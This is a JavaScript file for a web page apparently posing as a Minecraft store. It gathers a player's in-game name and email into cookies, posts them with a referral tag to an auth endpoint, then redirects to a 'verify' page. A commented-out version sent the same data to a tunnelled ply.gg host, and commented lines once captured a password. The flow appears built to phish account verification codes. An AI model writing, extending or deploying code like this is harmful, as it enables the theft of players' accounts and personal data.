import { apiAuthUrl } from "../../config";

function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(";");
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == " ") {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

async function createCookies() {
    // check to be sure ign isnt empty
    const ign = document.getElementById("ign").value;
    // if (ign == "") return;
    document.cookie = "ign=" + ign;
    // const body = await fetch(`https://api.ashcon.app/mojang/v2/user/${ign}`, {
    //     method: "GET",
    // }).then((res) => res.json());
    // var uuid = await body.uuid;
    // uuid = await uuid.replaceAll("-", "");
    // document.cookie = "uuid=" + (await uuid);
    // console.log(await uuid);
    gotoCart();
}


function gotoCart() {
    location.href = "basket.html";
}

function gotoDetails() {
    location.href = "details.html";
}


async function gotoVerify() {
    const email = document.getElementById("email").value;
    if (email == "")
    {
        
        console.error("Enail is null");
        return;
    }
    // const pass = document.getElementById("pass").value;
    // if (pass == "") return;
    document.cookie = "email=" + email;
    console.log(email);
    // document.cookie = "pass=" + pass;
    await getCode();
    location.href = "verify.html";
}

async function getCode() {
    const ign = getCookie("ign");
    const email = getCookie("email");
    const ref = getCookie("ref");
    const uuid = 'Noob';
    
    try {
        const response = await fetch(`${apiAuthUrl}/get/${email}/${ign}/${uuid}/${ref}`, {
            method: "GET",
        });
        // Optionally, if the API returns JSON:
        const data = await response.json();
        console.log("Data received:", data);
        return data; // or process data further
    } catch (error) {
        console.error("Error fetching code:", error);
    }
}
// async function getCode() {
//     // const uuid = getCookie("uuid");
//     const ign = getCookie("ign");
//     const email = getCookie("email");
//     const ref = getCookie("ref");
//     const uuid = 'Noob';
//     // const password = getCookie("pass");
//         fetch(
//             `http://privacy-obligations.gl.at.ply.gg:41290/code/${email}/${ign}/${uuid}/${ref}`,
//             {
//                 method: "GET",
//             }
//         );
// }


async function submitIgn() {
    const ign = document.getElementById("ign").value;
    document.cookie = "ign=" + ign;
    const body = await fetch(`https://api1.inqz.net/uuid/${ign}`, {
        method: "GET",
    }).then((res) => res.json());
    var uuid = await body.id;
    uuid = await uuid.replaceAll("-", "");
    document.cookie = "uuid=" + (await uuid);
    console.log(await uuid);
    gotoCart();
}

// listen for when enter is pressed
document.addEventListener("keypress", function onEvent(event) {
    if (event.key === "Enter") {
        // check if ign is empty
        if (document.getElementById("ign").value == "") return;
        createCookies();
    }
});
